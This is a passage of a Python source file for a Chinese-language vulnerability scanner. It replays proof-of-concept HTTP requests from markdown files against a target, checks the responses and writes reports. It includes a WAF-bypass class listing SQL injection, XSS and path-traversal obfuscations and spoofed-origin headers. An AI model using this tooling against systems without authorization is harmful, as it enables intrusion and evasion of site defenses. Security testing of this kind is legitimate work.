                if attempt < self.config.max_retries: time.sleep(self.config.retry_delay * 2)
            except: break
        self._stats["failed"] += 1; return None
    @property
    def stats(self): return dict(self._stats)


class POCParser:
    PATTERNS = [r"```plain\s*(.*?)\s*```", r"```http\s*(.*?)\s*```", r"```bash\s*(.*?)\s*```", r"```\s*(GET|POST|PUT|DELETE)\s+(.*?)\s*```"]
    def __init__(self, logger=None):
        self.logger = logger
    def parse_file(self, path):
        if not os.path.exists(path): return []
        try:
            with open(path,"r",encoding="utf-8") as f: content = f.read()
        except: return []
        results = []
        for pat in self.PATTERNS:
            for m in re.findall(pat, content, re.DOTALL|re.IGNORECASE):
                p = self._parse(m if isinstance(m,str) else m[0])
                if p: results.append(p)
        if not results:
            for i, line in enumerate(content.split("\n")):
                if line.upper().startswith(("GET ","POST ","PUT ","DELETE ")):
                    p = self._parse("\n".join(content.split("\n")[i:i+20]))
                    if p: results.append(p)
        return results
    @staticmethod
    def _parse(raw):
        lines = raw.strip().split("\n")
        if not lines: return None
        first = lines[0].split(" ",1)
        if len(first)<2 or first[0].upper() not in ("GET","POST","PUT","DELETE","HEAD","OPTIONS","PATCH"): return None
        headers, body, in_body = {}, "", False
        for line in lines[1:]:
            if in_body: body += line + "\n"
            elif line.strip() == "": in_body = True
            elif ": " in line and not line.startswith((" ","\t")):
                k,v = line.split(": ",1); headers[k.strip()] = v.strip()
        return {"method":first[0].upper(),"path":first[1].split(" ")[0],"headers":headers,"body":body.strip()}


class ReportGenerator:
    def __init__(self, config, logger):
        self.config, self.logger = config, logger; os.makedirs(config.report_dir, exist_ok=True)
    def generate(self, target, results, fingerprint, stats, batch_results=None, probe_results=None):
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        domain = re.sub(r'[^\w]','_',target.split("//")[-1][:30])
        json_path = os.path.join(self.config.report_dir, f"scan_{domain}_{ts}.json")
        report = {
            "scan_info": {"target":target,"timestamp":datetime.now().isoformat(),"version":"2.5"},
            "fingerprint": fingerprint,
            "summary": {"total":stats.get("total",0),"skipped":stats.get("skipped",0),
                       "vulnerable":len([r for r in results if r.get("vuln")]),
                       "requests":stats.get("requests",0),"elapsed":stats.get("elapsed",0),
                       "probe_findings":len(probe_results) if probe_results else 0},
            "vulnerabilities": [r for r in results if r.get("vuln")],
            "probe_results": probe_results,
            "batch_results": batch_results,
        }
        with open(json_path,"w",encoding="utf-8") as f: json.dump(report,f,indent=2,ensure_ascii=False,default=str)
        html_path = os.path.join(self.config.report_dir, f"scan_{domain}_{ts}.html")
        with open(html_path,"w",encoding="utf-8") as f: f.write(self._build_html(target,results,fingerprint,stats,batch_results,probe_results))
        self.logger.info(f"报告：{html_path}")
        return html_path

    def _build_html(self, target, results, fingerprint, stats, batch_results=None, probe_results=None):
        vulns = [r for r in results if r.get("vuln")]
        elapsed = stats.get("elapsed",0)
        probe_section = ""
        if probe_results:
            high_probes = [p for p in probe_results if p.get("severity") in ("high","medium")]
            if high_probes:
                rows = "".join(f'<tr class="vuln"><td>{p.get("path",p.get("url",""))}</td><td>{p.get("vuln_type","")}</td><td>{p.get("reason","")}</td><td>{p.get("severity","")}</td></tr>' for p in high_probes)
                probe_section = f'<div class="section"><h2>攻击探测发现 ({len(high_probes)})</h2><table><tr><th>路径</th><th>类型</th><th>描述</th><th>严重度</th></tr>{rows}</table></div>'
        vuln_rows = "".join(f'<tr class="vuln"><td>{v.get("poc_name","")}</td><td>{v.get("method","")}</td><td class="url">{v.get("url","")}</td><td>{v.get("status_code","")}</td><td>{v.get("confidence",0)}</td><td>{v.get("reason","")}</td><td class="payload">{v.get("payload","")[:60]}</td></tr>' for v in vulns)
        vuln_section = f'<div class="section"><h2>漏洞详情 ({len(vulns)})</h2><table><tr><th>POC</th><th>方法</th><th>URL</th><th>状态码</th><th>置信度</th><th>原因</th><th>Payload</th></tr>{vuln_rows}</table></div>' if vulns else '<div class="section"><h2>未发现漏洞</h2></div>'
        fp_items = "".join(f"<tr><td>{k}</td><td>{v}</td></tr>" for k,v in fingerprint.items() if v and k!="content_hash")
        return f"""<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><title>Scanner v2.5 - {target}</title><style>body{{font-family:-apple-system,"Microsoft YaHei",sans-serif;background:#0d1117;color:#c9d1d9;margin:0;padding:20px}}.header{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;margin-bottom:16px}}.header h1{{margin:0 0 8px;color:#58a6ff;font-size:22px}}.section{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;margin-bottom:16px}}.section h2{{margin:0 0 12px;color:#e6edf3;font-size:17px}}table{{width:100%;border-collapse:collapse;font-size:13px}}th{{background:#21262d;color:#8b949e;text-align:left;padding:8px 10px;border-bottom:1px solid #30363d}}td{{padding:8px 10px;border-bottom:1px solid #21262d;word-break:break-all}}tr.vuln{{background:rgba(248,81,73,0.1)}}.vuln-count{{color:#f85149;font-weight:bold;font-size:18px}}.safe-count{{color:#3fb950}}.payload{{font-family:monospace;color:#d2a8ff;font-size:12px}}.stats{{display:flex;gap:24px;margin:12px 0}}.stat{{text-align:center}}.stat .num{{font-size:28px;font-weight:bold}}.stat .label{{font-size:12px;color:#8b949e}}</style></head><body><div class="header"><h1>POC Scanner v2.5 攻击即探测</h1><div style="color:#8b949e;font-size:13px">目标：<strong>{target}</strong> | {datetime.now().strftime("%Y-%m-%d %H:%M:%S")} | {elapsed:.0f}s</div><div class="stats"><div class="stat"><div class="num vuln-count">{len(vulns)}</div><div class="label">漏洞</div></div><div class="stat"><div class="num">{stats.get("requests",0)}</div><div class="label">请求</div></div><div class="stat"><div class="num">{len(probe_results) if probe_results else 0}</div><div class="label">探测发现</div></div></div></div>{probe_section}<div class="section"><h2>指纹</h2><table>{fp_items}</table></div>{vuln_section}</body></html>"""

    def list_reports(self):
        if not os.path.exists(self.config.report_dir): return []
        return sorted([os.path.join(self.config.report_dir,f) for f in os.listdir(self.config.report_dir) if f.endswith(".html")], reverse=True)[:20]


class ScanOrchestrator:
    def __init__(self, config: ScanConfig):
        self.config = config
        self.logger = setup_logger("Scanner", config.log_level, config.log_file or None)
        self.rate_limiter = RateLimiter(config.payload_interval)
        self.session = requests.Session()
        self.session.verify = False
        adapter = requests.adapters.HTTPAdapter(pool_connections=5, pool_maxsize=5, max_retries=0)
        self.session.mount("https://", adapter)
        self.session.mount("http://", adapter)

        self._check_poc_repo()
        
        self.modules = ModuleManager(config.module_dir, self.logger)
        self.fingerprint_engine = FingerprintEngine(config, self.session, self.logger)
        self.payload_generator = PayloadGenerator(self.logger, self.modules)
        self.request_engine = RequestEngine(config, self.rate_limiter, self.session, self.logger)
        self.poc_parser = POCParser(self.logger)
        self.report_generator = ReportGenerator(config, self.logger)
        self.memory_guard = MemoryGuard(config, self.logger)
        self.checkpoint = CheckpointManager(config, self.logger)
        self.prefilter = POCPrefilter(self.logger, self.modules)
        self.analyzer = ResponseAnalyzer(config.target_url, self.logger)
        self.prober = AttackProber(config, self.session, self.rate_limiter, self.logger, self.analyzer)
        self.waf_bypasser = WAFBypasser(config, self.logger)

        self.results: List[Dict] = []
        self._stop_event = Event()
        self._target_urls: List[str] = []

    def _check_poc_repo(self):
        if self.config.poc_folder and os.path.exists(self.config.poc_folder):
            return
        default_poc_dir = "POC"
        if os.path.exists(default_poc_dir):
            self.config.poc_folder = default_poc_dir
            return
        print("正在自动下载 POC 库...")
        try:
            import subprocess
            subprocess.run(["git", "clone", "--depth", "1", self.config.poc_repo_url, default_poc_dir],
                          check=True, capture_output=True)
            self.config.poc_folder = default_poc_dir
            print(f"POC 库已下载到 {default_poc_dir}")
        except Exception as e:
            print(f"POC 库下载失败：{e}，请手动指定 POC 目录")

    def load_targets(self, filepath: str) -> int:
        if not os.path.exists(filepath):
            self.logger.error(f"目标文件不存在：{filepath}")
            return 0
        urls = []
        with open(filepath, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    urls.append(line)
        self._target_urls = urls
        return len(urls)

    def scan(self) -> List[Dict]:
        base_url = self.config.target_url
        self.logger.info("=" * 50)
        self.logger.info(f"开始攻击探测：{base_url}")
        self.logger.info("=" * 50)

        fingerprint = self.fingerprint_engine.identify(base_url)
        if "error" in fingerprint:
            self.logger.error(f"指纹识别失败：{fingerprint.get('error')}")
            return []

        self.analyzer = ResponseAnalyzer(base_url, self.logger)
        self.prober = AttackProber(self.config, self.session, self.rate_limiter, self.logger, self.analyzer)

        probe_results = []
        probe_results.extend(self.prober.probe_paths())
        probe_results.extend(self.prober.probe_params(self.analyzer.discovered_params))
        probe_results.extend(self.prober.probe_errors())

        all_pocs = self._get_poc_list()
        if not all_pocs:
            self.logger.warning("未找到 POC，仅使用攻击探测结果")

        results = []
        vuln_probes = [p for p in probe_results if p.get("vuln")]
        results.extend(vuln_probes)

        if all_pocs and self.config.enable_prefilter:
            self.prefilter.build_profile(fingerprint)

        if all_pocs:
            self.logger.info(f"开始 POC 扫描：{len(all_pocs)} 个")
            for i, poc_name in enumerate(all_pocs):
                if self._stop_event.is_set():
                    break

                result = self._scan_single(poc_name, base_url, fingerprint)
                results.append(result)

                if (i + 1) % self.config.memory_check_interval == 0:
                    self.memory_guard.check()

                if result.get("vuln"):
                    self.logger.info(f"[{i+1}/{len(all_pocs)}] {result['poc_name']} | {result.get('reason','')}")

            elapsed = time.time()
            vuln_count = len([r for r in results if r.get("vuln")])
            self.logger.info("=" * 50)
            self.logger.info(f"完成 | 总漏洞：{vuln_count} (探测：{len(vuln_probes)}, POC: {vuln_count - len(vuln_probes)})")

        self.report_generator.generate(base_url, results, fingerprint,
                                       {"total": len(all_pocs), "skipped": 0,
                                        "requests": self.rate_limiter.request_count,
                                        "elapsed": time.time() - elapsed},
                                       probe_results=probe_results)
        self.results = results
        return results

    def _get_poc_list(self) -> List[str]:
        folder = self.config.poc_folder
        if not folder or not os.path.exists(folder):
            return []
        return [f.replace(".md", "") for f in os.listdir(folder) if f.endswith(".md")]

    def _scan_single(self, poc_name: str, base_url: str, fingerprint: Dict) -> Dict:
        folder = self.config.poc_folder
        poc_path = os.path.join(folder, f"{poc_name}.md")
        
        if not os.path.exists(poc_path):
            return {"poc_name": poc_name, "status": "文件不存在", "vuln": False}

        if self.config.enable_prefilter:
            with open(poc_path, "r", encoding="utf-8") as f:
                content = f.read()
            ok, reason = self.prefilter.should_scan(poc_name, content)
            if not ok:
                return {"poc_name": poc_name, "status": "预筛选跳过", "reason": reason, "skipped": True, "vuln": False}

        parsed = self.poc_parser.parse_file(poc_path)
        if not parsed:
            return {"poc_name": poc_name, "status": "解析失败", "vuln": False}

        for req in parsed:
            method = req.get("method", "GET")
            path = req.get("path", "")
            body = req.get("body", "")
            headers = req.get("headers", {})

            if not path.startswith("http"):
                path = ("/" + path) if not path.startswith("/") else path
                target_url = base_url.rstrip("/") + path
            else:
                target_url = path

            merged_headers = {**self.fingerprint_engine.get_headers(), **headers}
            resp = self.request_engine.send(method, target_url, merged_headers, body)

            if resp is None:
                continue

            verifier = VulnVerifier(self.config, fingerprint, self.logger, self.modules)
            custom_rule = None
            for m in self.modules.payloads:
                if m.get("name") == poc_name:
                    custom_rule = m.get("verify")
                    break

            is_vuln, confidence, reason = verifier.verify(resp, body, poc_name, custom_rule)

            if is_vuln:
                return {
                    "poc_name": poc_name,
                    "method": method,
                    "url": target_url,
                    "payload": body[:200] if body else path[:200],
                    "status_code": resp.status_code,
                    "response_length": len(resp.text),
                    "confidence": confidence,
                    "reason": reason,
                    "vuln": True,
                }

        return {"poc_name": poc_name, "status": "未命中", "vuln": False}

    def stop(self):
        self._stop_event.set()


class PayloadGenerator:
    def __init__(self, logger, modules):
        self.logger = logger
        self.modules = modules

    def generate(self, surface: Dict) -> List[Dict]:
        payloads = []
        for url in surface.get("urls", []):
            payloads.append({"method": "GET", "url": url, "source": "discovered"})
        for param in surface.get("params", []):
            payloads.append({"method": "GET", "param": param, "source": "discovered"})
        return payloads


class MemoryGuard:
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger

    def check(self):
        try:
            import psutil
            mem = psutil.virtual_memory()
            if mem.percent > self.config.max_memory_percent:
                self.logger.warning(f"内存使用率 {mem.percent:.1f}% 超过阈值，暂停 10 秒")
                time.sleep(10)
        except ImportError:
            pass
        except Exception:
            pass


class WAFBypasser:
    ENCODING_TECHNIQUES = {
        "url_double": lambda x: "".join(f"%{ord(c):02X}" for c in x),
        "url_unicode": lambda x: "".join(f"%u{ord(c):04X}" if c.isalpha() else c for c in x),
        "url_extra": lambda x: "".join(f"%{ord(c):02X}%{ord(c):02X}" for c in x),
        "hex": lambda x: "".join(f"\\x{ord(c):02x}" for c in x),
        "unicode": lambda x: "".join(f"\\u{ord(c):04x}" for c in x),
        "base64": lambda x: __import__("base64").b64encode(x.encode()).decode(),
    }

    SQL_OBFUSCATION = [
        lambda x: x.replace(" ", "/**/"),
        lambda x: x.replace(" ", "%09"),
        lambda x: x.replace(" ", "%0A"),
        lambda x: x.replace("AND", "AnD").replace("OR", "Or").replace("SELECT", "SeLeCt"),
        lambda x: x.replace("=", "%3D").replace("<", "%3C").replace(">", "%3E"),
        lambda x: x.replace("'", "%27").replace('"', '%22'),
        lambda x: x.replace("UNION", "UNI/**/ON").replace("SELECT", "SEL/**/ECT"),
        lambda x: x + " AND '1'='1",
        lambda x: x.replace("(", "%28").replace(")", "%29"),
    ]

    XSS_OBFUSCATION = [
        lambda x: x.replace("<", "%3C").replace(">", "%3E"),
        lambda x: x.replace("script", "scr%69pt"),
        lambda x: x.replace("alert", "ale%72t"),
        lambda x: x.replace(" ", "%09").replace("(", "%28").replace(")", "%29"),
        lambda x: x.replace("<script>", "<scr<script>ipt>"),
        lambda x: x.replace("'", "%27").replace('"', "%22"),
        lambda x: x.replace("javascript:", "java&#115;cript:"),
        lambda x: x.replace("onerror", "one%72ror"),
        lambda x: x.replace("onload", "onl%6Fad"),
    ]

    PATH_TRAVERSAL_OBFUSCATION = [
        lambda x: x.replace("../", "..%2f").replace("..\\", "..%5c"),
        lambda x: x.replace("..", "....//").replace("..", "....\\"),
        lambda x: x.replace("/", "%252f").replace("\\", "%255c"),
        lambda x: x.replace("../", "..%c0%af"),
        lambda x: x.replace("../", "..%255c"),
        lambda x: x.replace("../", "%2e%2e%2f"),
        lambda x: x.replace("../", "%2e%2e/"),
        lambda x: x.replace("../", "..%ef%bc%8f"),
    ]

    HEADER_BYPASS = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"Forwarded": "for=127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Host": "localhost"},
        {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
        {"User-Agent": "curl/7.64.1"},
        {"Accept-Language": "en-US,en;q=0.9"},
        {"Accept-Encoding": "gzip, deflate, br"},
    ]

    CHUNKED_ENCODING = True

    def __init__(self, config, logger):
        self.config = config
        self.logger = logger
        self.bypass_attempts = 0
        self.successful_techniques = []

    def bypass_request(self, method, url, headers=None, body="", payload_type="sql_injection"):
        self.bypass_attempts += 1
        results = []

        if payload_type == "sql_injection":
            obfuscation_funcs = self.SQL_OBFUSCATION
        elif payload_type == "xss":
            obfuscation_funcs = self.XSS_OBFUSCATION
        elif payload_type == "path_traversal":
            obfuscation_funcs = self.PATH_TRAVERSAL_OBFUSCATION
        else:
            obfuscation_funcs = []

        for obfuscate_func in obfuscation_funcs[:5]:
            try:
                modified_body = obfuscate_func(body) if body else body
                modified_url = url

                for enc_name, enc_func in list(self.ENCODING_TECHNIQUES.items())[:3]:
                    try:
                        encoded_payload = enc_func(modified_body[:50]) if modified_body else ""
                    except:
                        encoded_payload = modified_body

                    try:
                        test_headers = dict(headers) if headers else {}
                        for header_mod in self.HEADER_BYPASS[:5]:
                            test_headers.update(header_mod)

                            result = {
                                "url": modified_url,
                                "method": method,
                                "headers": test_headers,
                                "body": modified_body,
                                "technique": f"{obfuscation_funcs.index(obfuscate_func)}_{enc_name}",
                            }
                            results.append(result)

                            if len(results) >= 10:
                                return results
                    except Exception:
                        continue
            except Exception:
                continue

        return results if results else [{"url": url, "method": method, "headers": headers, "body": body, "technique": "original"}]

    def generate_bypass_variants(self, payload, payload_type="sql_injection"):
        variants = []

        if payload_type == "sql_injection":
            obfuscation_funcs = self.SQL_OBFUSCATION
        elif payload_type == "xss":
            obfuscation_funcs = self.XSS_OBFUSCATION
        elif payload_type == "path_traversal":
            obfuscation_funcs = self.PATH_TRAVERSAL_OBFUSCATION
        else:
            obfuscation_funcs = []

        for i, obfuscate_func in enumerate(obfuscation_funcs[:8]):
            try:
                modified = obfuscate_func(payload)
                variants.append({"payload": modified, "technique": f"obfuscate_{i}", "type": payload_type})
            except:
                pass

        for enc_name, enc_func in list(self.ENCODING_TECHNIQUES.items())[:4]:
            try:
                encoded = enc_func(payload)
                variants.append({"payload": encoded, "technique": f"encoding_{enc_name}", "type": payload_type})
            except:
                pass

        return variants if variants else [{"payload": payload, "technique": "original", "type": payload_type}]

    def record_success(self, technique):
        if technique not in self.successful_techniques:
            self.successful_techniques.append(technique)
            self.logger.info(f"WAF 绕过成功：{technique}")

    def get_preferred_techniques(self):
        return self.successful_techniques if self.successful_techniques else ["original"]


def main():
    print("=" * 50)
    print("  POC Scanner v2.5 — 攻击即探测")
    print("  输入 help 查看命令 | 输入 scan 开始扫描 | 输入 attack 攻击探测")
    print("=" * 50)

    config = ScanConfig.from_file()
    logger = setup_logger("Scanner", config.log_level)
    modules = ModuleManager(config.module_dir, logger)
    scanner = None

    while True:
        try:
            cmd = input("\n> ").strip()
            if not cmd:
                continue

            lower = cmd.lower()

            if lower == "exit":
                print("再见！")
                break

            if lower == "help":
                print(modules._help())
                continue

            if lower.startswith("targets"):
                parts = cmd.split(maxsplit=1)
                if len(parts) < 2:
                    print("用法：targets <URL 列表文件>")
                    continue
                filepath = parts[1].strip()
                if not scanner:
                    scanner = ScanOrchestrator(config)
                count = scanner.load_targets(filepath)
                print(f"已加载 {count} 个目标")
                continue

            if lower == "report":
                rg = ReportGenerator(config, logger)
                reports = rg.list_reports()
                if not reports:
                    print("暂无报告")
                else:
                    print(f"最近 {len(reports)} 份报告:")
                    for i, r in enumerate(reports):
                        size = os.path.getsize(r) if os.path.exists(r) else 0
                        print(f"  {i+1}. {os.path.basename(r)} ({size/1024:.1f}KB)")
                    print(f"\n报告目录：{os.path.abspath(config.report_dir)}")
                continue

            if lower == "scan":
                if not config.poc_folder:
                    config.poc_folder = input("POC 目录：").strip()
                config.save()

                if not scanner:
                    scanner = ScanOrchestrator(config)
                
                if not config.poc_folder or not os.path.exists(config.poc_folder):
                    print("正在自动检测 POC 库...")
                    scanner._check_poc_repo()

                if not config.target_url:
                    config.target_url = input("目标 URL: ").strip()
                
                try:
                    scanner.scan()
                except KeyboardInterrupt:
                    scanner.stop()
                    print("\n已中断")
                continue

            if lower == "attack":
                if not scanner:
                    scanner = ScanOrchestrator(config)
                
                if not config.target_url:
                    config.target_url = input("目标 URL: ").strip()
                    config.save()
                
                try:
                    scanner.scan()
                except KeyboardInterrupt:
                    scanner.stop()
                    print("\n已中断")
                continue

            result = modules.execute(cmd)
            if result:
                print(result)

        except KeyboardInterrupt:
            print()
            continue
        except EOFError:
            break
        except Exception as e:
            print(f"错误：{e}")


if __name__ == "__main__":
    main()
